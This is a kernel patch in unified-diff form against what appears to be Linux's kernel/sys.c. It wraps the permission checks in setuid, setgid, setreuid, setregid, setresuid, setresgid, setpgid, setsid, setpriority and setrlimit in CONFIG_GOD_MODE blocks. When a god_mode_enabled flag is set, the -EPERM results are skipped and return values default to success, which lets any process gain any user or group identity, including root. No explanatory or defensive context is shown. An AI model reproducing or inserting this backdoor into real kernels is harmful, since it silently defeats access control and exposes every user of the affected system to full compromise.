@@ -156,10 +156,17 @@ static int set_one_prio(struct task_struct *p, int niceval, int error)
 {
 	int no_nice;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	if (!set_one_prio_perm(p)) {
 		error = -EPERM;
 		goto out;
 	}
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 	if (niceval < task_nice(p) && !can_nice(p, niceval)) {
 		error = -EACCES;
 		goto out;
@@ -567,14 +574,21 @@ SYSCALL_DEFINE2(setregid, gid_t, rgid, gid_t, egid)
 {
 	const struct cred *old;
 	struct cred *new;
-	int retval;
+	int retval = 0;
 
 	new = prepare_creds();
 	if (!new)
 		return -ENOMEM;
 	old = current_cred();
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	retval = -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 	if (rgid != (gid_t) -1) {
 		if (old->gid == rgid ||
 		    old->egid == rgid ||
@@ -614,14 +628,21 @@ SYSCALL_DEFINE1(setgid, gid_t, gid)
 {
 	const struct cred *old;
 	struct cred *new;
-	int retval;
+	int retval = 0;
 
 	new = prepare_creds();
 	if (!new)
 		return -ENOMEM;
 	old = current_cred();
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	retval = -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 	if (nsown_capable(CAP_SETGID))
 		new->gid = new->egid = new->sgid = new->fsgid = gid;
 	else if (gid == old->gid || gid == old->sgid)
@@ -677,14 +698,21 @@ SYSCALL_DEFINE2(setreuid, uid_t, ruid, uid_t, euid)
 {
 	const struct cred *old;
 	struct cred *new;
-	int retval;
+	int retval = 0;
 
 	new = prepare_creds();
 	if (!new)
 		return -ENOMEM;
 	old = current_cred();
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	retval = -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 	if (ruid != (uid_t) -1) {
 		new->uid = ruid;
 		if (old->uid != ruid &&
@@ -738,14 +766,21 @@ SYSCALL_DEFINE1(setuid, uid_t, uid)
 {
 	const struct cred *old;
 	struct cred *new;
-	int retval;
+	int retval = 0;
 
 	new = prepare_creds();
 	if (!new)
 		return -ENOMEM;
 	old = current_cred();
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	retval = -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 	if (nsown_capable(CAP_SETUID)) {
 		new->suid = new->uid = uid;
 		if (uid != old->uid) {
@@ -779,7 +814,7 @@ SYSCALL_DEFINE3(setresuid, uid_t, ruid, uid_t, euid, uid_t, suid)
 {
 	const struct cred *old;
 	struct cred *new;
-	int retval;
+	int retval = 0;
 
 	new = prepare_creds();
 	if (!new)
@@ -787,7 +822,13 @@ SYSCALL_DEFINE3(setresuid, uid_t, ruid, uid_t, euid, uid_t, suid)
 
 	old = current_cred();
 
-	retval = -EPERM;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+        retval = -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (!nsown_capable(CAP_SETUID)) {
 		if (ruid != (uid_t) -1 && ruid != old->uid &&
 		    ruid != old->euid  && ruid != old->suid)
@@ -844,14 +885,20 @@ SYSCALL_DEFINE3(setresgid, gid_t, rgid, gid_t, egid, gid_t, sgid)
 {
 	const struct cred *old;
 	struct cred *new;
-	int retval;
+	int retval = 0;
 
 	new = prepare_creds();
 	if (!new)
 		return -ENOMEM;
 	old = current_cred();
 
-	retval = -EPERM;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+        retval = -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (!nsown_capable(CAP_SETGID)) {
 		if (rgid != (gid_t) -1 && rgid != old->gid &&
 		    rgid != old->egid  && rgid != old->sgid)
@@ -1030,7 +1077,13 @@ SYSCALL_DEFINE2(setpgid, pid_t, pid, pid_t, pgid)
 		goto out;
 
 	if (same_thread_group(p->real_parent, group_leader)) {
-		err = -EPERM;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+        err = -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		if (task_session(p) != task_session(group_leader))
 			goto out;
 		err = -EACCES;
@@ -1042,7 +1095,13 @@ SYSCALL_DEFINE2(setpgid, pid_t, pid, pid_t, pgid)
 			goto out;
 	}
 
-	err = -EPERM;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+        err = -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (p->signal->leader)
 		goto out;
 
@@ -1141,8 +1200,14 @@ SYSCALL_DEFINE0(setsid)
 	struct task_struct *group_leader = current->group_leader;
 	struct pid *sid = task_pid(group_leader);
 	pid_t session = pid_vnr(sid);
-	int err = -EPERM;
-
+	int err = 0;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+        err = -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	write_lock_irq(&tasklist_lock);
 	/* Fail if I am already a session leader */
 	if (group_leader->signal->leader)
@@ -1483,8 +1548,15 @@ return -EPERM;
 		/* Keep the capable check against init_user_ns until
 		   cgroups can contain all limits */
 		if (new_rlim->rlim_max > rlim->rlim_max &&
-				!capable(CAP_SYS_RESOURCE))
+				!capable(CAP_SYS_RESOURCE)) {
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 			retval = -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+		}
 		if (!retval)
 			retval = security_task_setrlimit(tsk->group_leader,
 					resource, new_rlim);
